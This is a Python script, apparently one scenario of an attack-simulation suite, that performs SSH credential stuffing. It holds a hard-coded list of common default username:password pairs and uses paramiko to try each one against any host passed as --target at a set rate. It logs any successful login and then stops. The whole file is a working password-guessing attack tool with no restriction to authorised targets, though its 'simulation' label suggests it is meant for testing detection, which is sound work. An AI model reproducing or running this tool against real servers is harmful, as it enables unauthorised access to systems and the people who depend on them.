"""
Scenario 4: SSH Credential Stuffing Simulation

Uses a list of username:password combinations (from leaked databases).
Each pair is tried exactly once - no repetition.

Usage:
    python credential_stuffing.py --target 192.168.1.100 --rate 5
"""

import argparse
import time
import logging
from datetime import datetime

try:
    import paramiko
except ImportError:
    import sys
    print("Install paramiko: pip install paramiko")
    sys.exit(1)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

# Simulated leaked credential pairs (username:password)
CREDENTIAL_PAIRS = [
    ('admin', 'admin'), ('admin', 'password'), ('admin', '123456'),
    ('root', 'toor'), ('root', 'password'), ('root', 'root123'),
    ('user', 'user'), ('user', 'password123'), ('user', '12345'),
    ('test', 'test'), ('test', 'test123'), ('test', 'password'),
    ('ubuntu', 'ubuntu'), ('ubuntu', 'password'), ('ubuntu', '123456'),
    ('deploy', 'deploy'), ('deploy', 'password'), ('deploy', 'changeme'),
    ('jenkins', 'jenkins'), ('jenkins', 'password'), ('jenkins', 'admin'),
    ('git', 'git'), ('git', 'password'), ('git', '12345'),
    ('postgres', 'postgres'), ('postgres', 'password'), ('postgres', 'admin'),
    ('mysql', 'mysql'), ('mysql', 'password'), ('mysql', 'root'),
    ('oracle', 'oracle'), ('oracle', 'password'), ('oracle', 'admin'),
    ('ftp', 'ftp'), ('ftp', 'password'), ('ftp', 'anonymous'),
    ('www-data', 'www-data'), ('www-data', 'password'),
    ('backup', 'backup'), ('backup', 'password123'),
    ('pi', 'raspberry'), ('pi', 'password'),
    ('vagrant', 'vagrant'), ('guest', 'guest'),
]


def run_credential_stuffing(
    target: str,
    port: int = 22,
    rate: float = 5,
    max_attempts: int = 40,
):
    """Run credential stuffing simulation."""
    delay = 1.0 / rate
    creds = CREDENTIAL_PAIRS[:max_attempts]

    logger.info(f"=== Credential Stuffing Simulation ===")
    logger.info(f"Target: {target}:{port}")
    logger.info(f"Credential pairs: {len(creds)}")
    logger.info(f"Rate: {rate} attempts/sec")
    logger.info(f"Starting at: {datetime.now().isoformat()}")
    logger.info(f"{'='*50}")

    for i, (username, password) in enumerate(creds):
        logger.info(f"[{i+1}/{len(creds)}] Trying: {username}:{password}")

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                hostname=target, port=port,
                username=username, password=password,
                timeout=3, look_for_keys=False, allow_agent=False,
            )
            logger.warning(f"SUCCESS! Credentials: {username}:{password}")
            client.close()
            break
        except paramiko.AuthenticationException:
            pass
        except Exception as e:
            logger.debug(f"Error: {e}")
        finally:
            client.close()

        time.sleep(delay)

    logger.info(f"Credential stuffing completed.")
    logger.info(f"Finished at: {datetime.now().isoformat()}")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='SSH Credential Stuffing Simulation')
    parser.add_argument('--target', required=True)
    parser.add_argument('--port', type=int, default=22)
    parser.add_argument('--rate', type=float, default=5)
    parser.add_argument('--max-attempts', type=int, default=40)
    args = parser.parse_args()

    run_credential_stuffing(
        target=args.target, port=args.port,
        rate=args.rate, max_attempts=args.max_attempts,
    )
